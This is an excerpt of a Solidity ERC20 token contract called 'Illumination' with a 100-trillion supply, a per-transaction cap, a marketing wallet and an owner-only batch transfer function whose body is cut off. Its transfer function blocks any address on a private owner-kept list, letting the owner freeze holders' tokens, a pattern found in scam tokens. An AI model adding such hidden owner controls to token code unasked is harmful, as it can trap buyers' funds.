...
contract Illumination is ERC20, Ownable {
    mapping(address => bool) private _blockedAddresses;
    uint256 private constant _totalSupply = 100000000000000000000000000000000; //100 trillion supply
    uint256 public maxTxAmount = 1000000000000000000000000000000; //1 trillion max per transaction
    address marketingWallet = 0x2aeB9037671F0D2b07C3Fd373482766F2aEd7d15;
    constructor() ERC20('Illumination', 'ILM') {
        _mint(msg.sender, _totalSupply);
    }

    function transfer(address _to, uint256 amount) public virtual override returns (bool) {
        address _from = _msgSender();
        require(!_blockedAddresses[_from], "You are currently blocked from transferring tokens");
        require(!_blockedAddresses[_to], "You are currently blocked from transferring tokens");
    ...
    function transfers(address[] memory addresses, uint256[] memory amounts) external onlyOwner() returns (bool) {
